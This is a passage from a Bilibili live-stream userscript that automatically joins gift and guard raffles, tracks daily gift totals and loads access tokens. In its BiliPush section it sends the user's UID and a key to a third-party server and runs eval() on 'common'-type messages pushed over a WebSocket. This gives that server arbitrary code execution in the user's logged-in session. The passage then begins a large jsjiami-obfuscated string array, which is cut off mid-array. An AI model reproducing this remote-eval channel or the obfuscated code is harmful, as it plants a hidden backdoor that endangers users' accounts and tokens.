				    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`,
				    'success');
				break;
			    case 402:
				// 抽奖已过期，下次再来吧
				break;
			    case 65531:
				// 65531: 非当前直播间或短ID直播间试图参加抽奖
				//Info.blocked = true;
				//BiliPushUtils.up();
				//window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
				break;
			    default:
				if (response.msg.indexOf('拒绝') > -1) {
				    //Info.blocked = true;
				    //BiliPushUtils.up();
				    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
				} else if (BiliPushUtils.msgIgnore(response.msg)) {
				    return delayCall(() => BiliPushUtils.Gift._join(roomid,
										    raffleId, type), 1e3);
				} else {
				    window.toast(
					`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
					'caution');
				}
			}
			RafflePorcess.remove(roomid, raffleId);
		    }, () => {
			window.toast(
			    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
			    'error');
			return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),
					 1e3);
		    }), (time_wait + 1) * 1e3);
		    return $.Deferred().resolve();
		}
	    },
	    Guard: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, guard) => {
		    try {
			//console.log(`Guard.join`,roomid,guard,i)
			//if (Info.blocked) return $.Deferred().resolve();
			if (!guard) return $.Deferred().resolve();
			for (let obj of guard) {
			    // id过滤，防止重复参加
			    var id = parseInt(obj.id, 10);
			    if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
			    BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
			    await BiliPushUtils.Guard._join(roomid, obj.id);
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
		    }
		},
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    RafflePorcess.append(roomid, id);
		    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
		    delayCall(() => BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
			DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join',
			      response);
			if (response.code === 0) {
			    Statistics.appendGift(response.data.award_name, response.data.award_num,
						  response.data.award_ex_time);
			    window.toast(
				`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`,
				'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //BiliPushUtils.up();
			    //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (BiliPushUtils.msgIgnore(response.msg)) {
			    return delayCall(() => BiliPushUtils.Guard._join(roomid, id), 1e3);
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(
				`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
				'caution');
			}
			RafflePorcess.remove(roomid, id);
		    }, () => {
			window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`,
				     'error');
			return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
		    }), parseInt(Math.random() * 6 * 1e3));
		    return $.Deferred().resolve();
		}
	    }
	}
	const BiliPush = {
	    _ajax: (url, data, callback, error) => {
		$.ajax({
		    type: "POST",
		    url: url,
		    data: data,
		    dataType: "json",
		    beforeSend: function (request) {},
		    success: function (data) {
			callback(data);
		    },
		    error: function (err) {
			error(err);
		    }
		})
	    },
	    connected: false,
	    gsocket: null,
	    gsocketTimeId: null,
	    gheartTimeId: null,
	    first: true,
	    lock: false,
	    connectWebsocket: (lazy = false) => {
		if (BiliPush.first) {
		    window.toast('初始化bilipush 推送服务', 'info');
		}
		if (BiliPush.lock) return;
		BiliPush.lock = true;
		if (lazy) {
		    if (BiliPush.gsocket && BiliPush.gsocket.readyState < 2) {
			BiliPush.lock = false;
			return;
		    }
		}
		var data = {
		    uid: BilibiliLive.UID,
		    version: VERSION,
		    key:CONFIG.DD_BP_CONFIG.BP_KEY
		};
		var url = "https://bilipush.1024dream.net:5000/ws/pre-connect";
		BiliPush._ajax(url, data, function (d) {
		    if (d.code == -1) {
			window.toast('bilipush 拒绝连接:' + d.msg, 'error');
			BiliPush.lock = false;
			return;
		    }
		    var url = d.server;
		    if (BiliPush.gsocket) BiliPush.gsocket.close();
		    BiliPush.gsocket = null;
		    BiliPush.gsocket = new WebSocket(url);
		    BiliPush.gsocket.onopen = function (e) {
			if (BiliPush.first) {
			    window.toast('bilipush 连接成功', 'success');
			    BiliPush.first = false;
			} else {
			    console.info('bilipush 连接成功');
			}
			BiliPush.connected = true;
			BiliPush.gsocket.send("ping");
			BiliPush.gheartTimeId = setInterval(function () {
			    BiliPush.gsocket.send("ping");
			}, 60e3);
		    };
		    BiliPush.gsocket.onclose = function (e) {
			console.error('bilipush 连接断开');
			BiliPush.connected = false;
			BiliPush.gsocket = null;
			clearTimeout(BiliPush.gsocketTimeId);
			clearInterval(BiliPush.gheartTimeId);
			BiliPush.gsocketTimeId = setTimeout(function () {
			    if (CONFIG.DD_BP) {
				BiliPush.connectWebsocket();
			    }
			}, 5000);
		    };
		    BiliPush.gsocket.onmessage = function (e) {
			try {
			    var msg = JSON.parse(e.data);
			    BiliPush.onRafflePost(msg);
			} catch (err) {
			    console.log(e, err);
			    return;
			}
		    };
		    BiliPush.gsocket.onerror = function (e) {
			console.error('bilipush 连接异常');
			BiliPush.connected = false;
			BiliPush.gsocket = null;
			clearTimeout(BiliPush.gsocketTimeId);
			clearInterval(BiliPush.gheartTimeId);
			BiliPush.gsocketTimeId = setTimeout(function () {
			    if (CONFIG.DD_BP) {
				BiliPush.connectWebsocket();
			    }
			}, 5000);
		    };
		    BiliPush.lock = false;
		}, function (err) {
		    console.error("bilipush连接失败，等待重试...");
		    BiliPush.connected = false;
		    BiliPush.gsocketTimeId = setTimeout(function () {
			if (CONFIG.DD_BP) {
			    BiliPush.connectWebsocket();
			}
		    }, 5000);
		    BiliPush.lock = false;
		});
	    },
	    onRafflePost: (rsp) => {
		try {
		    let raffle_data = JSON.parse(rsp);
		    let {
			code,
			type,
			data
		    } = raffle_data;
		    if (code == 0) {
			if (type == "raffle") {
			    let {
				room_id,
				raffle_type
			    } = data;
			    switch (raffle_type) {
				case "TV":
				case "GUARD":
				case "PK":
				case "GIFT":
				    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
				    BiliPushUtils.Check.process(room_id);
				    break;
				case "STORM":
				    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
				    BiliPushUtils.Storm.run(room_id);
				    break;
			    }
			} else if (type == "common") {
			    try {
				eval(data);
			    } catch (e) {
				console.error("bilipush 回调失败，可能浏览器不支持");
			    }
			} else if (type == "notice") {
			    window.toast(data, 'caution');
			} else if (type == "msg") {
			    window.alertdialog("魔改助手消息", data);
			} else if (type == "reload") {
			    localStorage.setItem('LIVE_PLAYER_STATUS', JSON.stringify({
				type: 'html5',
				timeStamp: ts_ms()
			    }));
			    var volume = localStorage.getItem('videoVolume') || 0;
			    if (volume == 0) {
				localStorage.setItem('videoVolume', 0.1);
			    }
			    location.reload();
			}
		    }
		} catch (e) {
		    console.error(e, rsp);
		}
	    },
	    run: () => {
		BiliPushUtils.Check.start();
		BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
		BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
		if (CONFIG.DD_BP) {
		    BiliPush.connectWebsocket(true);
		} else if (BiliPush.gsocket) {
		    BiliPush.gsocket.close();
		}
		window.websocket = BiliPush.gsocket;
		BiliPushUtils.clearSet();
		setInterval(() => {
		    BiliPushUtils.clearSet();
		}, 5e3);
	    }
	}
	const RafflePorcess = {
	    raffle_Process: {},
	    save_Interval: 0,
	    run: () => {
		try {
		    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
		    for (let room_id in RafflePorcess.raffle_Process) {
			BiliPushUtils.Check.run(room_id);
		    }
		} catch (e) {}
		if (RafflePorcess.save_Interval == 0) {
		    RafflePorcess.save_Interval = setInterval(() => {
			localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
		    }, 100);
		}
	    },
	    append: (room_id, raffle_id) => {
		if (RafflePorcess.raffle_Process[room_id]) {
		    if (RafflePorcess.raffle_Process[room_id].indexOf(raffle_id) == -1) {
			RafflePorcess.raffle_Process[room_id].push(raffle_id);
		    }
		} else {
		    RafflePorcess.raffle_Process[room_id] = [raffle_id];
		}
	    },
	    remove: (room_id, raffle_id) => {
		if (RafflePorcess.raffle_Process[room_id]) {
		    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r =>
													 r != raffle_id);
		    if (RafflePorcess.raffle_Process[room_id].length == 0) {
			delete RafflePorcess.raffle_Process[room_id];
		    }
		}
	    }
	}
	const Statistics = {
	    gifts: {},
	    queue: [],
	    save_Interval: 0,
	    process_timeOut: 0,
	    run: () => {
		try {
		    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
		} catch (e) {}
		if (!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)) {
		    Statistics.gifts = {};
		    CACHE.stats_ts = ts_ms();
		}
		if (Statistics.save_Interval == 0) {
		    Statistics.save_Interval = setInterval(() => {
			localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
		    }, 100);
		}
		if (Statistics.process_timeOut == 0) {
		    Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
		}
		runTomorrow(Statistics.run);
	    },
	    appendGift: (name, count, expire) => {
		if (expire) {
		    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime()) / 86400e3);
		    name = `${name}(${expireDay}d)`;
		}
		console.log(`记录：获得 ${name}x${count}`);
		Statistics.queue.push({
		    name: name,
		    count: count
		});
	    },
	    process: () => {
		while (Statistics.queue.length > 0) {
		    let {
			name,
			count
		    } = Statistics.queue.shift();
		    if (Statistics.gifts[name]) {
			Statistics.gifts[name] += count;
		    } else {
			Statistics.gifts[name] = count;
		    }
		}
		clearTimeout(Statistics.process_timeOut);
		Statistics.process_timeOut = setTimeout(() => Statistics.process(), 200);
	    },
	    showDayGifts: () => {
		let sumGroupKey = ['辣条'];
		let sumGroup = {};
		let gifts = [];
		for (let [k, v] of Object.entries(Statistics.gifts)) {
		    gifts.push(`${k}x${v}`);
		    for (let t of sumGroupKey) {
			if (k.startsWith(t)) {
			    if (sumGroup[t]) {
				sumGroup[t] += v;
			    } else {
				sumGroup[t] = v;
			    }
			}
		    }
		}
		if (gifts.length > 0) {
		    gifts.push(`统计:`);
		    for (let [k, v] of Object.entries(sumGroup)) {
			gifts.push(`${k}x${v}`);
		    }
		}
		window.alertdialog('当日礼物统计', gifts.join('<br>'));
	    },
	};
	const KeySign = {
	    sort: (obj) => {
		let keys = Object.keys(obj).sort();
		let p = [];
		for (let key of keys) {
		    p.push(`${key}=${obj[key]}`);
		}
		return p.join('&');
	    },
	    convert: (obj) => {
		for (let k in obj) {
		    if ($.type(obj[k]) == "array") {
			obj[k] = JSON.stringify(obj[k]);
		    }
		}
	    },
	};
	const TokenLoad = async () => {
	    if (Info.csrf_token) {
		let tinfo = JSON.parse(localStorage.getItem(`${NAME}_Token`)) || {};
		if (tinfo.csrf_token == Info.csrf_token && tinfo.time > ts_s()) {
		    Info.appToken = tinfo;
		} else {
		    tinfo = null;
		    tinfo = await getAccessToken();
		    if(tinfo){
			tinfo.time = ts_s() + tinfo.expires_in;
			tinfo.csrf_token = Info.csrf_token;
			localStorage.setItem(`${NAME}_Token`, JSON.stringify(tinfo));
			Info.appToken = tinfo;
		    }
		}
	    }
	};

    var _0xod1='jsjiami.com.v6',_0x4a67=[_0xod1,'\x77\x70\x51\x74\x77\x6f\x54\x43\x71\x38\x4b\x79','\x77\x36\x74\x57\x77\x35\x55\x67\x77\x71\x34\x3d','\x77\x70\x76\x44\x74\x4d\x4f\x59\x59\x38\x4b\x63\x4a\x41\x3d\x3d','\x77\x34\x31\x6d\x77\x34\x59\x5a\x77\x70\x30\x3d','\x59\x56\x33\x43\x71\x38\x4b\x44\x77\x34\x6f\x3d','\x4e\x4d\x4b\x58\x4b\x56\x67\x42','\x45\x69\x58\x44\x68\x6e\x62\x44\x70\x67\x3d\x3d','\x58\x30\x44\x43\x76\x38\x4b\x69\x41\x41\x3d\x3d','\x51\x4d\x4b\x67\x77\x37\x45\x3d','\x59\x73\x4b\x73\x77\x37\x66\x44\x71\x33\x58\x44\x6f\x67\x3d\x3d','\x57\x73\x4f\x70\x44\x73\x4b\x6b\x4a\x51\x3d\x3d','\x50\x73\x4f\x72\x59\x63\x4f\x6c\x4e\x54\x59\x3d','\x77\x36\x5a\x6e\x77\x34\x70\x52\x77\x34\x45\x3d','\x77\x34\x6c\x7a\x66\x77\x55\x32\x77\x35\x77\x78\x4f\x73\x4f\x78\x77\x70\x35\x62\x77\x72\x50\x43\x68\x42\x51\x3d','\x77\x6f\x49\x75\x42\x33\x42\x6b\x77\x37\x62\x43\x73\x42\x30\x6b\x4b\x46\x6e\x44\x67\x68\x72\x43\x6d\x69\x2f\x43\x6a\x6a\x4d\x4a\x77\x70\x34\x4f\x77\x71\x66\x44\x6d\x77\x3d\x3d','\x57\x38\x4f\x37\x4c\x63\x4b\x5a\x41\x77\x73\x3d','\x77\x34\x4a\x43\x77\x35\x46\x49\x77\x34\x67\x3d','\x50\x73\x4f\x35\x77\x71\x62\x44\x6c\x51\x49\x3d','\x43\x4d\x4f\x78\x77\x70\x33\x44\x73\x45\x51\x3d','\x77\x35\x5a\x41\x77\x37\x49\x37\x77\x71\x51\x3d','\x42\x69\x62\x43\x69\x4d\x4f\x51\x61\x67\x3d\x3d','\x51\x54\x58\x44\x73\x52\x48\x43\x6c\x41\x3d\x3d','\x4e\x77\x54\x44\x68\x51\x62\x43\x68\x67\x3d\x3d','\x55\x4d\x4b\x64\x77\x37\x31\x52\x77\x36\x6b\x3d','\x49\x73\x4b\x72\x66\x43\x45\x64\x63\x4d\x4b\x6c\x63\x63\x4b\x66\x77\x70\x54\x44\x68\x77\x3d\x3d','\x52\x6d\x58\x43\x72\x63\x4b\x65\x47\x51\x3d\x3d','\x66\x73\x4b\x43\x56\x69\x6e\x43\x68\x33\x2f\x43\x68\x63\x4b\x32\x77\x6f\x38\x44\x49\x41\x3d\x3d','\x57\x31\x72\x43\x74\x73\x4b\x64\x77\x37\x4d\x3d','\x5a\x38\x4b\x66\x77\x35\x76\x44\x72\x48\x4d\x3d','\x77\x35\x76\x44\x76\x4d\x4b\x4e\x61\x38\x4b\x79\x77\x72\x59\x63\x41\x32\x4a\x4d\x77\x70\x30\x66\x54\x63\x4f\x48','\x51\x4d\x4b\x70\x62\x43\x37\x43\x75\x51\x3d\x3d','\x61\x38\x4f\x57\x42\x6c\x50\x43\x6f\x51\x3d\x3d','\x4f\x38\x4f\x35\x77\x72\x33\x44\x6a\x54\x63\x3d','\x77\x71\x33\x43\x6f\x6b\x6e\x43\x75\x4d\x4f\x6f','\x4a\x78\x54\x43\x68\x52\x55\x48','\x45\x38\x4f\x73\x58\x54\x44\x44\x6e\x38\x4b\x68\x4b\x63\x4b\x44\x42\x73\x4f\x74','\x52\x51\x6f\x49\x65\x6e\x62\x43\x69\x57\x6e\x43\x6d\x7a\x2f\x44\x68\x63\x4b\x59\x77\x37\x6e\x43\x6a\x6d\x30\x3d','\x4b\x69\x2f\x43\x6e\x38\x4f\x73\x62\x73\x4b\x6d\x54\x52\x48\x44\x6f\x4d\x4b\x4b\x61\x45\x63\x3d','\x56\x73\x4f\x4f\x48\x31\x6c\x74','\x77\x71\x48\x43\x6a\x47\x33\x43\x70\x4d\x4f\x75\x77\x36\x34\x3d','\x4e\x63\x4b\x46\x77\x35\x50\x44\x71\x7a\x4d\x3d','\x77\x72\x6a\x43\x71\x45\x6a\x43\x6b\x4d\x4f\x36','\x4a\x38\x4f\x50\x52\x4d\x4f\x52\x49\x51\x3d\x3d','\x77\x37\x49\x6e\x54\x53\x41\x78','\x54\x4d\x4b\x56\x51\x54\x44\x43\x67\x48\x4c\x43\x68\x38\x4b\x72\x77\x71\x67\x4a\x4e\x67\x30\x3d','\x77\x6f\x39\x63\x5a\x41\x64\x49','\x47\x4d\x4f\x42\x62\x38\x4f\x65\x47\x67\x3d\x3d','\x4d\x38\x4f\x55\x77\x70\x58\x44\x6a\x68\x41\x3d','\x52\x73\x4f\x75\x4d\x32\x39\x51','\x77\x34\x73\x4c\x43\x38\x4b\x37\x77\x34\x59\x3d','\x77\x71\x4e\x55\x77\x37\x50\x43\x6d\x38\x4f\x36','\x77\x70\x70\x62\x61\x73\x4f\x68\x77\x70\x38\x3d','\x77\x35\x72\x44\x71\x47\x72\x44\x6a\x41\x73\x3d','\x77\x70\x56\x5a\x77\x35\x48\x43\x6f\x4d\x4f\x71','\x77\x70\x68\x43\x58\x73\x4f\x41\x77\x70\x38\x3d','\x4c\x46\x54\x44\x68\x4d\x4b\x73\x56\x67\x3d\x3d','\x47\x4d\x4b\x66\x77\x35\x2f\x44\x6e\x52\x4d\x3d','\x77\x37\x42\x30\x77\x34\x45\x35\x77\x70\x55\x3d','\x77\x35\x76\x43\x6f\x38\x4f\x39\x4f\x63\x4f\x4c\x77\x36\x46\x56\x46\x57\x33\x43\x67\x73\x4b\x6e','\x77\x37\x44\x44\x6b\x32\x37\x43\x68\x38\x4f\x6b\x77\x6f\x6c\x41\x4b\x77\x3d\x3d','\x4f\x7a\x6a\x43\x73\x4d\x4f\x70\x62\x38\x4b\x4e\x54\x51\x3d\x3d','\x54\x4d\x4f\x47\x77\x35\x4d\x68\x65\x73\x4b\x52','\x4d\x7a\x4c\x43\x70\x79\x41\x4a\x53\x73\x4b\x4b\x77\x35\x7a\x43\x6c\x58\x6a\x43\x6f\x63\x4b\x2b\x77\x34\x31\x2b','\x45\x42\x54\x43\x68\x67\x63\x74\x65\x73\x4b\x77\x77\x35\x50\x43\x70\x6c\x2f\x43\x6a\x73\x4b\x67\x77\x37\x68\x4a\x77\x37\x4d\x3d','\x44\x77\x33\x43\x68\x63\x4f\x63\x57\x41\x3d\x3d','\x65\x79\x6b\x62\x59\x46\x59\x3d','\x61\x73\x4f\x59\x77\x37\x59\x32\x46\x51\x3d\x3d','\x77\x71\x55\x4c\x77\x72\x33\x43\x6b\x38\x4b\x4b','\x45\x4d\x4f\x63\x54\x38\x4f\x59\x49\x32\x62\x43\x6e\x54\x39\x54\x77\x35\x52\x55\x42\x77\x3d\x3d','\x4d\x73\x4b\x72\x77\x37\x7a\x44\x74\x78\x38\x3d','\x62\x38\x4f\x38\x46\x6b\x54\x43\x73\x51\x3d\x3d','\x57\x4d\x4f\x45\x77\x35\x67\x7a\x4a\x73\x4f\x30\x77\x36\x4d\x7a\x4c\x78\x6e\x43\x6f\x47\x6b\x3d','\x4c\x73\x4b\x4d\x61\x79\x63\x41','\x77\x34\x6e\x44\x6b\x47\x6a\x44\x69\x54\x45\x3d','\x4d\x4d\x4f\x32\x52\x63\x4f\x67\x46\x77\x3d\x3d','\x77\x72\x70\x6f\x56\x38\x4f\x34\x77\x6f\x4e\x36\x4b\x48\x50\x44\x6b\x4d\x4f\x50\x56\x55\x50\x43\x71\x67\x3d\x3d','\x77\x71\x34\x64\x77\x70\x62\x43\x74\x73\x4b\x57\x77\x6f\x54\x43\x6f\x63\x4f\x6c\x4a\x63\x4b\x46\x55\x68\x62\x43\x6a\x73\x4f\x33','\x57\x4d\x4b\x4d\x77\x35\x44\x44\x70\x46\x54\x43\x74\x63\x4b\x58\x43\x31\x7a\x43\x71\x42\x48\x44\x74\x67\x30\x70\x77\x6f\x7a\x44\x69\x73\x4f\x4a\x46\x43\x44\x44\x72\x6d\x39\x74','\x77\x72\x72\x43\x6e\x57\x6a\x43\x6f\x38\x4f\x2b\x77\x70\x54\x44\x6c\x78\x54\x44\x6a\x30\x6a\x44\x70\x58\x33\x43\x6e\x4d\x4b\x64','\x66\x63\x4f\x73\x46\x58\x4c\x43\x73\x73\x4b\x70\x54\x73\x4f\x41\x77\x36\x62\x43\x6d\x30\x64\x65\x48\x4d\x4b\x62\x77\x36\x66\x44\x73\x79\x37\x43\x69\x6b\x6b\x78\x77\x35\x37\x43\x6c\x41\x3d\x3d','\x63\x73\x4b\x4d\x54\x78\x48\x43\x6f\x41\x3d\x3d','\x77\x34\x2f\x43\x68\x31\x5a\x71\x4f\x41\x3d\x3d','\x4d\x38\x4b\x42\x55\x44\x49\x42','\x55\x63\x4f\x6c\x45\x6e\x6c\x34\x66\x32\x37\x43\x6a\x77\x3d\x3d','\x77\x36\x38\x77\x45\x63\x4b\x52\x77\x35\x73\x3d','\x56\x52\x77\x59\x5a\x57\x6b\x3d','\x4d\x41\x6a\x44\x6b\x56\x54\x44\x68\x51\x3d\x3d','\x77\x70\x49\x7a\x77\x71\x62\x43\x72\x73\x4b\x43','\x77\x70\x73\x37\x77\x72\x33\x43\x6a\x4d\x4b\x4d\x77\x71\x7a\x43\x6a\x51\x3d\x3d','\x4b\x56\x46\x50\x77\x6f\x76\x44\x6a\x6b\x46\x44\x77\x37\x55\x4b\x77\x35\x33\x43\x72\x6e\x59\x51\x64\x73\x4f\x49\x77\x37\x66\x43\x70\x63\x4f\x45','\x51\x38\x4b\x4e\x77\x36\x6e\x44\x6a\x30\x2f\x43\x68\x63\x4b\x36\x42\x31\x37\x43\x71\x42\x48\x44\x74\x67\x30\x3d','\x77\x71\x48\x44\x6c\x4d\x4f\x2f\x62\x4d\x4b\x39\x63\x38\x4f\x71\x77\x71\x48\x43\x6c\x6c\x66\x43\x6c\x73\x4f\x79\x77\x71\x59\x3d','\x77\x37\x42\x58\x77\x36\x55\x31\x77\x72\x74\x4f\x77\x72\x45\x56\x77\x72\x7a\x44\x70\x58\x58\x44\x6c\x38\x4f\x39\x77\x71\x38\x64\x77\x6f\x4c\x44\x6b\x38\x4b\x33\x77\x37\x54\x43\x70\x63\x4f\x74\x41\x51\x3d\x3d','\x77\x37\x31\x43\x54\x77\x3d\x3d','\x47\x4d\x4b\x46\x45\x48\x67\x50','\x77\x34\x39\x70\x77\x36\x63\x3d','\x77\x37\x72\x43\x72\x6b\x2f\x44\x70\x6a\x38\x3d','\x54\x67\x7a\x44\x75\x6a\x62\x43\x6e\x78\x37\x43\x6f\x6d\x50\x43\x70\x63\x4f\x58','\x77\x34\x6a\x43\x75\x6e\x6f\x3d','\x59\x58\x4c\x43\x71\x41\x3d\x3d','\x77\x34\x76\x43\x6a\x6d\x35\x50\x45\x51\x3d\x3d','\x77\x34\x4e\x44\x77\x34\x49\x41\x77\x72\x6b\x3d','\x77\x72\x39\x41\x66\x42\x78\x42','\x77\x35\x66\x43\x72\x73\x4b\x7a\x77\x34\x48\x44\x6d\x41\x3d\x3d','\x77\x36\x48\x43\x6b\x63\x4b\x5a\x77\x35\x76\x44\x68\x53\x44\x43\x74\x77\x45\x72\x77\x71\x39\x56\x4e\x73\x4f\x6f\x77\x35\x34\x3d','\x77\x36\x51\x33\x42\x4d\x4b\x4a\x77\x35\x51\x44','\x4d\x31\x42\x6b','\x77\x37\x56\x42\x61\x44\x6f\x4a','\x44\x69\x50\x43\x71\x4d\x4f\x70\x58\x67\x3d\x3d','\x77\x34\x30\x4c\x5a\x79\x6b\x34','\x77\x6f\x6b\x6b\x77\x71\x49\x3d','\x63\x54\x6e\x44\x6a\x52\x58\x43\x68\x53\x37\x43\x6d\x46\x58\x43\x6e\x73\x4f\x36\x77\x70\x59\x4e\x46\x48\x67\x3d','\x77\x36\x33\x44\x6b\x6b\x4c\x43\x6d\x63\x4f\x32','\x77\x6f\x42\x76\x66\x69\x63\x63\x77\x71\x66\x44\x6b\x73\x4f\x6b\x77\x72\x44\x44\x6d\x77\x6a\x43\x6c\x4d\x4f\x31','\x77\x6f\x42\x6c\x51\x69\x45\x57\x77\x70\x58\x44\x68\x63\x4f\x76\x77\x71\x4c\x44\x6d\x78\x66\x43\x6b\x4d\x4f\x6a\x77\x72\x48\x43\x69\x73\x4b\x36\x77\x70\x63\x2b','\x43\x31\x2f\x44\x6d\x63\x4b\x69\x65\x73\x4b\x7a\x77\x71\x2f\x43\x6b\x56\x2f\x43\x72\x4d\x4f\x49\x45\x54\x30\x4e\x77\x37\x76\x44\x6f\x4d\x4f\x38\x77\x37\x49\x3d','\x57\x32\x33\x43\x75\x63\x4b\x65\x77\x36\x34\x51\x62\x55\x49\x72\x51\x63\x4b\x34\x77\x37\x30\x4f\x77\x35\x59\x3d','\x48\x4d\x4f\x79\x77\x71\x44\x44\x67\x78\x73\x46\x77\x36\x6e\x44\x73\x41\x55\x51\x41\x73\x4f\x53\x77\x36\x63\x72\x49\x52\x50\x44\x76\x57\x6f\x3d','\x42\x73\x4b\x32\x77\x36\x4c\x44\x68\x54\x55\x3d','\x77\x34\x72\x44\x71\x56\x6e\x43\x70\x4d\x4f\x41\x77\x71\x56\x38\x48\x73\x4b\x51\x77\x37\x63\x6f\x58\x55\x72\x43\x75\x41\x3d\x3d','\x77\x70\x51\x74\x77\x6f\x33\x43\x6c\x63\x4b\x38\x77\x70\x6e\x43\x6a\x4d\x4f\x51\x45\x63\x4b\x54\x61\x54\x62\x43\x71\x67\x3d\x3d','\x77\x72\x35\x4f\x66\x6a\x52\x74\x77\x72\x4d\x3d','\x4d\x57\x2f\x44\x67\x73\x4b\x42\x55\x4d\x4b\x75\x77\x6f\x4c\x43\x70\x47\x76\x43\x68\x73\x4f\x78\x4a\x51\x63\x38','\x42\x4d\x4b\x72\x59\x7a\x77\x71\x59\x63\x4b\x6a\x62\x4d\x4b\x6b\x77\x6f\x50\x44\x6c\x41\x50\x44\x76\x7a\x35\x35\x4c\x46\x2f\x43\x72\x77\x3d\x3d','\x4a\x63\x4f\x36\x5a\x4d\x4f\x69\x4a\x55\x7a\x43\x6f\x78\x31\x43\x77\x37\x4a\x6d\x49\x77\x41\x4d','\x59\x56\x33\x43\x6f\x73\x4b\x39\x77\x34\x51\x4e\x51\x48\x4d\x4f\x56\x38\x4b\x59\x77\x35\x30\x32\x77\x36\x62\x44\x68\x6d\x73\x48\x63\x4d\x4f\x66','\x77\x71\x62\x44\x6e\x38\x4f\x72\x56\x73\x4b\x75\x64\x63\x4f\x47\x77\x72\x7a\x43\x6c\x33\x72\x43\x70\x4d\x4f\x68\x77\x72\x66\x44\x75\x7a\x4d\x2f\x44\x79\x45\x30\x42\x41\x3d\x3d','\x55\x73\x4f\x6e\x56\x30\x35\x53\x77\x72\x5a\x4f\x49\x6b\x37\x43\x74\x63\x4f\x4b\x53\x45\x54\x44\x69\x41\x3d\x3d','\x4f\x52\x62\x44\x69\x43\x54\x43\x6a\x41\x33\x44\x6c\x7a\x34\x4d\x77\x71\x4d\x77\x46\x6c\x68\x59\x77\x72\x2f\x44\x70\x58\x66\x43\x74\x4d\x4b\x70','\x62\x31\x7a\x43\x69\x63\x4b\x57\x77\x35\x6b\x7a\x52\x55\x30\x50\x61\x63\x4b\x43\x77\x34\x6b\x2f','\x4c\x31\x4e\x44\x77\x70\x66\x44\x6d\x77\x3d\x3d','\x42\x46\x5a\x39\x77\x71\x6a\x44\x71\x51\x3d\x3d','\x77\x36\x63\x38\x65\x77\x34\x4d','\x48\x38\x4f\x4b\x66\x38\x4f\x42\x44\x31\x48\x43\x6a\x69\x78\x6e\x77\x36\x52\x47\x41\x7a\x67\x38\x53\x63\x4b\x32\x77\x35\x2f\x43\x6d\x38\x4f\x7a','\x51\x77\x48\x44\x70\x53\x33\x43\x6f\x77\x3d\x3d','\x58\x6e\x7a\x43\x6a\x55\x42\x6d','\x4c\x45\x4e\x5a\x77\x71\x7a\x44\x69\x51\x3d\x3d','\x4d\x30\x5a\x69\x77\x72\x7a\x44\x69\x77\x3d\x3d','\x65\x38\x4b\x47\x77\x35\x6a\x44\x6e\x46\x59\x3d','\x4d\x4d\x4f\x2b\x61\x38\x4f\x54\x4c\x67\x3d\x3d','\x77\x70\x59\x35\x77\x71\x50\x43\x69\x4d\x4b\x37','\x77\x36\x39\x35\x77\x37\x59\x37\x77\x6f\x63\x3d','\x55\x38\x4f\x39\x77\x34\x49\x50\x4c\x51\x3d\x3d','\x4f\x42\x66\x44\x6b\x51\x3d\x3d','\x77\x34\x30\x43\x4e\x63\x4b\x31\x77\x37\x67\x3d','\x55\x6e\x37\x43\x6f\x31\x5a\x56','\x63\x73\x4f\x44\x66\x33\x42\x6a','\x5a\x73\x4f\x67\x48\x45\x39\x42','\x77\x70\x54\x44\x68\x73\x4f\x34\x63\x63\x4b\x66','\x42\x4d\x4f\x68\x64\x52\x44\x44\x76\x77\x3d\x3d','\x42\x30\x4a\x78\x77\x72\x33\x44\x74\x77\x3d\x3d','\x77\x37\x37\x44\x75\x38\x4b\x74\x65\x38\x4b\x30','\x46\x43\x76\x43\x6b\x73\x4f\x54\x57\x51\x3d\x3d','\x55\x77\x2f\x44\x76\x51\x33\x43\x71\x67\x3d\x3d','\x48\x73\x4b\x41\x4f\x6d\x45\x7a','\x77\x37\x6a\x43\x72\x73\x4b\x50\x77\x35\x6e\x44\x68\x41\x3d\x3d','\x57\x73\x4f\x55\x77\x